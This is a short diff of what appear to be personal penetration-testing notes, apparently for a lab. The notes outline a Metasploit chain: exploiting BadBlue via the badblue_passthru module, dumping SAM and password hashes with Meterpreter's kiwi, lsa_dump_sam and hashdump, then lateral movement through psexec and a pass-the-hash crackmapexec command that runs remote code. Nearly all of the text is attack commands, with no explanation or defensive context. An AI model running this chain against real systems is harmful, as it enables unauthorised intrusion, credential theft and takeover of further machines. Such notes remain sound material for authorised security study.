@@ -1,4 +1,5 @@
-search badblue
+p:445
+search badblue_passthru
 
 set RHOSTS
 
@@ -10,3 +11,10 @@ meterpreter> migrate 780
 meterpreter> getuid
 meterpreter> load kiwi
 meterpreter> lsa_dump_sam
+meterpreter> hashdump
+
+search psexec
+
+set LPORT, RHOSTS, SMBUser, SMBPass, target (Native\ upload)
+
+crackmapexec smb "IP" -u Administrator -H "HASH" -x "ipconfig"
